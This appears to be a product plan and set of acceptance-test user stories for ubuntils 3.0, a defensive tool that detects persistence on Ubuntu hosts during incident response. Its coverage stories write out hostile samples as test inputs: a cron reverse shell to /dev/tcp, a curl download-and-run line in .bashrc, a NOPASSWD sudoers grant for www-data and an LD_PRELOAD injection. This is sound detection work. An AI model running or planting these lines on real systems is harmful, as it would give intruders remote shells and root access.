## 1. TL;DR

- **What:** ubuntils 3.0 is a persistence-focused second opinion with explainable scoring
  for a single Ubuntu host, live or from a bundle, shipped as one signed file that needs no pip.
- **For whom:** primarily the incident responder or IR consultant in the first hour on a
  suspect Ubuntu server; secondarily the on-call sysadmin with no IR team.
- **Why now:** an external practitioner review found the quality good and the breadth weak
  (17 checks; 9 ordinary intrusions missed; acquire-first and air-gapped use not viable).
- **How we'll know:** the north-star is the share of an independent benchmark (PANIX) that
  3.0 flags at MEDIUM or HIGH, published per release, held against a clean-host corpus
  that stays at ≤ 3 findings and 0 HIGH per image.
- **Not:** a fleet agent, a dashboard, a remediation tool, or a network-connected service.

## 2. Problem statement

### 2a. User problems

1. **The first hour is manual and incomplete.** A responder on a suspect Ubuntu host runs
   the same ten commands and misses one source (`sudoers.d`, `cron.d`,
   `authorized_keys2`, a drop-in). README "The Problem" describes this. The 2.x answer works:
   16 of 16 lab artifacts flagged, against 2 for rkhunter and 1 for chkrootkit
   (`tools/hostile-host/RESULTS.md`, 2026-10-23, written around ubuntils's own rules).
2. **Installing a tool changes the evidence.** 2.3.0 needs pip plus 5 direct (15 locked)
   packages on the suspect host (R-01). Isolated hosts can't install at all.
3. **Acquire-first is the forensically right path, and it is the weakest one.** `collect`
   captures 21 fixed files and 10 commands (`cli.py:47-85`), so `analyze BUNDLE` misses
   most of what `scan` sees (R-02).
4. **A clean report can be wrong about the obvious.** The reviewer walked nine ordinary
   intrusions through the code that 2.3.0 would not report. The three they worry about most
   are the first things they'd expect on a compromised web server: an SSH key added to an
   old `authorized_keys` (C1), a `/dev/shm` implant with a normal name (C2), and a root
   `/etc/cron.d` reverse shell (C3).

### 2b. Product problems

1. **Breadth.** 17 rules against a much larger persistence surface. The review lists 14
   locations with no collector (R-03) and inconsistent, per-rule command heuristics (R-04).
2. **Unproven noise control.** Validation covers a 26.04 arm64 VM, a 24.04 KVM guest and
   `ubuntu:24.04` containers. 2.2.0 went from 1,243 findings to 13 on a clean VM, and a
   container showed 411 `PACKAGE_TAMPERED` findings before the 2.3.0 fix (RESULTS.md). There
   is no corpus (R-07).
3. **Positioning overreaches.** The README headline is "forensic triage … and guided
   remediation". The reviewer would not remediate mid-incident with any tool, because
   removing one key before scoping tells the intruder they were seen. Their honest pitch is
   narrower: "a persistence-focused second opinion with explainable scoring, for a single
   live Ubuntu host".
4. **The README is 1,105 lines** (v3-dev). Its first screen doesn't say what to run or what
   a clean result does not mean.

### 2c. Technical trust problems

1. **It writes to the host by default** (R-08): Wazuh forwarding when an agent is present
   (`pipeline.py:279`), bundle staging with `/etc/shadow` in the temp dir
   (`bundle/writer.py:61`), backups and preserved evidence on the same disk.
2. **Integrity is a hash, not a signature** (R-09). The docs say so.
3. **The output contract moves fast** (R-10): two majors in six months. `schema_version`
   and ATT&CK IDs are already on v3-dev (ARCH-SV, E4-S1); `host_id` is still empty and
   nothing is frozen.
4. **Security-critical code has weak branch coverage.** `utils/safe_path.py` (the F-04
   fix) is at 55 % branch, and `sudoers._run_visudo_check` at 0 % (measured 2026-11-10).

**External evidence.** The reviewer's verdict: they would "run `ubuntils scan --json` today
as a second opinion on a live Ubuntu host I already have root on", but "would not yet make
it my acquisition tool, install it with pip on a suspect machine, or let it remediate during
an incident." Also: "The gap is breadth, not quality." Their ordered next steps (single
file, collect parity, PANIX first, shared matcher, clean corpus, process/timeline depth,
frozen contract) drive this plan's ordering.

## 3. Personas

| | **P1 IR consultant / responder** (primary) | P2 On-call sysadmin, SMB | P3 SOC analyst on Wazuh | P4 Detection-engineering student / researcher |

| Role | External or internal responder, called in after a suspicion | Runs 5–50 Ubuntu/Debian servers alone or in a tiny team | Tier-1/2 analyst; Wazuh is the SIEM | Builds or studies Linux detections |

| Current workaround | UAC to acquire, then manual grep through the collection; their own scripts | `ps`, `crontab -l`, `last`, guesswork; Lynis (wrong tool) | Pivot to the host and ask someone to run commands | Read the PANIX/ATT&CK docs; write ad-hoc rules |

| Constraints | No installs on the suspect host, chain of custody, no tipping off, offline | Little IR knowledge; time pressure; will be tempted to "just fix it" | Can't run tools on hosts themselves; needs stable fields | Wants to extend detections without forking |

**Primary persona: P1, the IR consultant/responder.** Reasons:
1. The external evidence comes from P1. The review is written by one, and its conditions
   for adopting the tool ("standard step in our Ubuntu triage runbook") are precise and
   achievable.
2. P1's requirements are a superset of P2's. No install, offline parity, low noise, an
   honest clean result and a frozen output all make P2's experience better too. The
   reverse is not true: designing for P2 pulls toward remediation, which P1 rejects.
3. P1 is how the tool spreads. Responders write runbooks, give talks and post in
   r/blueteamsec and DFIR channels.
4. It matches the Nullcon audience and the maintainer's career goal.

P2 is the secondary persona; P3 and P4 are served through E7 and E10/E11.

## 5. Positioning

**Statement (adopting the reviewer's pitch, sharpened):**
> For responders who land on a suspect Ubuntu host, ubuntils is a persistence-focused
> second opinion: one signed file, no install, no network, that checks the places attackers
> hide, explains every score, and says plainly what it could not see. Unlike collectors
> (UAC) it judges; unlike rootkit scanners (rkhunter, chkrootkit) it looks for persistence,
> not signatures; unlike fleet platforms (Velociraptor, osquery, Sandfly) it needs no agent,
> server or credentials store.

I adopt the pitch with one change: "single **live** Ubuntu host" becomes "a single Ubuntu
host, live or from a bundle". 3.0's offline parity (E5) is what earns that. If parity slips,
the word "live" goes back.

**Three claims with proof points**

| Claim | Proof point (3.0 GA) |
|---|---|
| It catches the persistence that matters | PANIX "caught N of M at MEDIUM+" published per release; C1–C9 regression tests |
| It is quiet on clean hosts | Clean-corpus counts per image per release (≤ 3, 0 HIGH) |
| It is safe to run on a hostile host | Hostile-host harness 100 %; a published threat model; zero network calls; nothing written outside its state dir (a tested list) |

**"Only we":** free, offline, opinionated and *explainable* judgement of persistence on a
single host. Every finding carries its weighted signals, and every blind spot is reported.

**What we deliberately are not:** an EDR, a fleet agent, a hardening auditor, a memory-forensics
tool, a remediation product, or anything that talks to the network.

## 8. User stories by epic

Fixed IDs in **bold**. Status: done / partial / open. "Closes" cites registry IDs.
Given/When/Then are the acceptance tests.

### E1 Trustworthy remediation

**E1-S1** (done 2.2.0). As P2, I want remediation dry-run by default so that nothing changes without `--confirm`.
Given `--remediate` without `--confirm`, when the scan finishes, then no file under `/` changes and no backup is written.

**E1-S2** (done 2.3.0; F-01, F-04). As P2, I want remediation and rollback that never follow a symlink, so that an attacker can't redirect root's write.
Given a remediated `~/.ssh` replaced by a symlink, when `ubuntils rollback BACKUP` runs, then it refuses and changes nothing.

**E1-S3** (done 2.3.0; N-15, F-03). As P2, I want hard blocks above the score so that `--remediate --confirm` can't lock me out.
Given a new host whose admin's only key changed this week, when `scan --remediate --confirm` runs, then the key is SKIPPED with `RECENCY_ONLY` whatever its confidence.

**E1-S4** (done v3-dev). As P1, I want every file copied and hashed before remediation changes it, so that evidence survives the fix.
Given 50 eligible files of 1 MiB, when `--remediate --confirm` runs, then all are preserved with a manifest in ≤ 2 s before any change; given one unreadable file, then nothing changes and every eligible finding is FAILED; given `--no-preserve` without `--yes`, then it exits with a usage error.

**E1-S5** (open; review positioning). As P1, I want remediation presented as an advanced, post-scoping step, so that nobody tips off an intruder by default.
Given the README and `scan --help`, when read top to bottom, then remediation first appears under "Advanced: after scoping" with the tip-off warning, and `--remediate --confirm` prints that warning once.

**E1-S6** (open; R-08). As P1, I want `--backup-dir DIR` so that backups don't land on the evidence disk.
Given `--backup-dir` on the same filesystem as the artifact, when remediation runs, then a warning names the filesystem; given a different filesystem, then no warning appears.

**E1-S7** (open; §2.2.3). As P2, I want remediators to act on a structured target, so that a changed file is never edited blindly.
Given a finding whose file changed after detection, when `--remediate --confirm` runs, then the result is SKIPPED with "changed since detection".

### E2 Zero-install triage

**E2-S1** (open; R-01). As P1, I want one file I can copy over SSH and run with the system `python3`, so that I install nothing on the suspect host.
Given a fresh offline Ubuntu 22.04, 24.04 or 26.04, when I run `sudo python3 ubuntils.pyz scan --json --output r.json`, then a report is written, no pip runs, and nothing is written outside the report and `/var/lib/ubuntils`.

**E2-S2** (open; R-01, R-09). As P1, I want to verify the single file offline, so that I know it isn't tampered with.
Given the release's `SHA256SUMS` and signature, when I verify on my laptop with a published key or Sigstore bundle, then verification passes; a modified byte fails.

**E2-S3** (open; R-08). As P1, I want a proven write list, so that I can state in my report what the tool changed.
Given `/` mounted read-only except `/var/lib/ubuntils` and the report path, when `scan --json --no-wazuh` runs, then it succeeds.

### E3 Signal over noise

**E3-S1** (done). Explainable confidence. Given any finding, when shown, then its signals and weights are listed.

**E3-S2** (done; N-14). Counted, attacker-proof suppression. Given a baseline entry naming a key comment, when a new key reuses that comment, then it is still reported.

**E3-S3** (open; announced 2.3.0). As P1/P2, I want `ubuntils baseline create --from report.json` to produce hash-keyed entries, so that known-good state is suppressed exactly.
Given a reviewed report, when I create a baseline and rescan, then only findings whose artifact hash changed reappear; a v1 baseline is refused in 3.0 with a migration hint.

**E3-S4** (open; R-07). As P2, I want connection findings based on evidence (exe location, listeners, deleted or memfd exe), not a fixed port list, so that application servers don't flood the report.
Given a PostgreSQL client in `/usr/bin` talking to 5432, when scanned, then no finding; given a `/dev/shm` exe talking to 443, then HIGH.

**E3-S5** (partial; fixed). Clean-host false-positive suite.
Given each stock container image (22.04, 24.04, 26.04, Debian 12), when the fp-suite runs in CI, then there is 0 HIGH and no finding outside the image's reviewed baseline, and the total is reported against ≤ 3. The 7 image-unpack ctime findings on 24.04 are fixed or baselined with a reason.

**E3-S6** (open; R-07). As P1, I want published clean-corpus counts for real VMs and cloud images, so that I can trust the noise level.
Given the corpus (3 cloud images, Docker host, Kubernetes node, DB server), when a release is cut, then `docs/results/<version>.md` lists findings per image.

**E3-S7** (open; QW-3). As P1, I want inventory (every SSH key) without it counting as noise.
Given a host with 2 keys and nothing malicious, when scanned, then 2 `inventory` findings appear and the corpus metric counts 0.

### E4 Speak the SOC's language

**E4-S1** (done v3-dev). Category and ATT&CK per rule. Given any finding, then `category` and `attack` are present in JSON and Wazuh.

**E4-S2** (open). As P1, I want a Markdown report I can paste into a case file.
Given `--format md --output r.md`, then the file has the §10.7 outline and every finding's evidence.

**E4-S3** (open; QW-7, QW-8). As P3, I want a stable `finding_id` and the SHA-256 of each flagged file, so that I can diff scans and pivot.
Given two scans of an unchanged host, then the `finding_id`s are identical; given a flagged regular file ≤ 64 MiB, then `artifact_sha256` is set (null with a reason otherwise).

**E4-S4** (open; R-10). `host_id` is populated.
Given a live scan, then `host_id` = SHA-256 of `/etc/machine-id` plus a fixed ubuntils salt (never the raw ID); given a bundle, then the collected host's value.

**E4-S5** (open; QW-9). As P1, I want `--fail-on-findings[=SEVERITY]` so that scripts can branch on results.
Given `--fail-on-findings=high` and one HIGH, then exit 4; given only MEDIUM, then exit 0; detection failure (1) and tampered bundle (3) take precedence.

**E4-S6** (open). Frozen JSON Schema.
Given every golden output, when validated against `schemas/report-3.json`, then it passes; a removed field fails CI.

### E5 Offline parity

**E5-S1** (open; R-02). As P1, I want `collect` to capture what the collectors read.
Given a fixture host, when `collect` runs, then the bundle contains every path and command output the collectors used (read-set), including globbed paths, per-PID `/proc` and unit files.

**E5-S2** (open; R-02). Given each fixture host, when `scan` and `collect`+`analyze` run, then the finding sets match, except rules declared `live_only`, which are listed as such.

**E5-S3** (open; QW-11, QW-6). Given `collect --journal-days 30`, then 30 days of journal are captured and `auth.log` is in the bundle.

**E5-S4** (open; QW-12). Given `collect`, then the staging directory is a 0700 directory under `/var/lib/ubuntils/`, never `$TMPDIR`, and it is removed on success, failure or Ctrl-C.

**E5-S5** (open; R-09). As P1, I want signed bundles, so that chain of custody doesn't depend on a side note.
Given `collect --sign-key KEY`, then `ssh-keygen -Y sign` produces `bundle.sig`; `ubuntils verify bundle --allowed-signers F` passes; one changed byte fails.

**E5-S6** (open). Given a 2.3.0 bundle, when 3.x `analyze` runs, then it completes and lists the collectors format 1 can't feed as degraded.

### E6 Fleet triage

**E6-S1** (open, Should). As P3, I want `ubuntils diff A.json B.json` keyed by `finding_id`.
Given two reports, then new, resolved and changed findings are listed.

**E6-S2** (won't in 3.0; decision D-4). Agentless SSH sweep.

### E7 Wazuh for real

**E7-S1** (open; R-08). Given an agent present and no `--wazuh`, then 3.0 writes nothing for Wazuh; 2.4 prints a notice when it forwards.

**E7-S2** (open; QW-13). Given every rule ID and alias, when its sample line goes through `wazuh-logtest` in CI, then the expected rule fires.

**E7-S3** (open). Supported Wazuh versions are documented and tested in CI.

### E8 Coverage expansion

**E8-S1** (open; R-04, QW-5, C3, C8). As P1, I want one command matcher everywhere commands live.
Given `bash -i >& /dev/tcp/203.0.113.5/4444 0>&1` in `/etc/cron.d/x` owned by root, then `CRON_SUSPICIOUS_COMMAND` HIGH with a `reverse_shell` signal. Given `bash <(curl -s h/x)` in a 30-day-old `.bashrc`, then `SHELL_RC_MODIFICATION` MEDIUM with `download_exec`. Given 1 MiB of pathological input, then matching finishes in < 50 ms.

**E8-S2** (open; C3, RL-01). Given entries in `/etc/anacrontab` and the `at` spool, then they are collected and pass through the matcher.

**E8-S3** (open; C4, RL-02, QW-13). Given a root-owned unit not owned by any package, created in the last 7 days, with `ExecStart=/usr/local/sbin/updater`, then `SUSPICIOUS_SYSTEMD_UNIT` MEDIUM with `unowned_unit` + recency signals. Given `ExecStopPost=`/`ExecCondition=`, a `.timer`, `.socket` or `.path` body, or a unit in `~/.local/share/systemd/user`, then it is evaluated. The old ID is accepted as an alias through 3.x.

**E8-S4** (open; C1, QW-3, RL-03, R-03). Given a key added to an `authorized_keys` last modified 30 days ago, then `SSH_KEY_INVENTORY` LOW lists it with its fingerprint. Given `environment=` or `permitopen=`, then a content signal applies. Given `AuthorizedKeysCommand` in `sshd_config`, or a `~/.ssh/rc`, then it is reported.

**E8-S5** (open; C6, RL-04). Given a UID < 1000 account with a login shell that the package database didn't create, or a user in `sudo`/`docker`/`lxd`/`disk`/`adm` added in the last 30 days, then a finding.

**E8-S6** (open; C5, QW-4, RL-05). Given `www-data ALL=(ALL) NOPASSWD: ALL` in `sudoers.d`, then `SUDOERS_NOPASSWD` HIGH; given a `sudoers.d` file no package owns, then a signal.

**E8-S7** (open; C2, QW-1, QW-2, RL-06, RL-07). Given a process running from `/dev/shm`, deleted, or memfd-backed, whatever its name, then `PROCESS_SUSPICIOUS_EXE` HIGH; given a listener owned by a non-standard exe, then a finding; given `python3` from a venv in `/opt` or `/home`, then nothing.

**E8-S8** (open; C7, RL-13). Given a setuid copy of bash in `/var/lib` or `/root`, then `SETUID_INVENTORY` flags it; given a file with `cap_setuid+ep`, then a finding (read from the `security.capability` xattr, no `getcap`).

**E8-S9** (open; C9, RL-14). Given `Environment=LD_PRELOAD=/opt/x.so` in a unit or drop-in, or `LD_AUDIT` anywhere, or a `/etc/ld.so.conf.d` entry outside standard lib dirs, then `LD_PRELOAD_INJECT`.

**E8-S10** (open; RL-11, R-03). Given `pam_exec.so` in an auth/account/session stack, or a PAM module file no package owns, then `PAM_BACKDOOR`.

**E8-S11** (open; R-03). Given a udev `RUN+=`, an XDG autostart `Exec=`, an `update-motd.d` script, `rc.local`, an `init.d` script, an apt `Pre-Invoke`/dpkg hook, a generator, or a `modules-load.d` entry that is unowned or matches the matcher, then a finding naming the hook.

**E8-S12** (open; RL-12). Given a module in `/sys/module` with a `refcnt`/`sections` entry but absent from `/proc/modules`, then HIGH.

**E8-S13** (open; RL-10). Given `chattr +i` on an `authorized_keys`, a cron dir or a unit dir, then `IMMUTABLE_FLAG_SET`.

**E8-S14** (open; RL-08). Given `alias sudo=`, `trap '…' DEBUG` or a `PROMPT_COMMAND` running a command in a shell init file, then a content signal.

**E8-S15** (open; RL-09). Given any `PACKAGE_TAMPERED` finding, then its description says `dpkg --verify` compares against checksums stored on this host, which a root intruder can edit.

## 14. Kill and pivot criteria

- **Kill 3.0 breadth, pivot to "2.x + collector":** if after beta.1 the PANIX coverage is
  below the 2.4.0 baseline plus 20 points, or any corpus image has HIGH findings that
  can't be fixed without disabling rules, ship 3.0 as the contract and deployability release
  only, and stop adding rules.
- **Pivot persona to P2:** if fewer than 2 P1 beta testers can be recruited by beta.2,
  while P2 testers engage, re-weight toward guided remediation docs (no new remediation code).
- **Drop the single file:** if the zipapp can't run on two of the three supported LTS system
  pythons by beta.2, ship a hash-locked wheelhouse tarball instead and say so.
- **Pause the project:** if hours available fall below 5 h/week for two consecutive
  months, freeze at 2.4.x (security fixes only) and publish that status in `MAINTAINERS.md`.
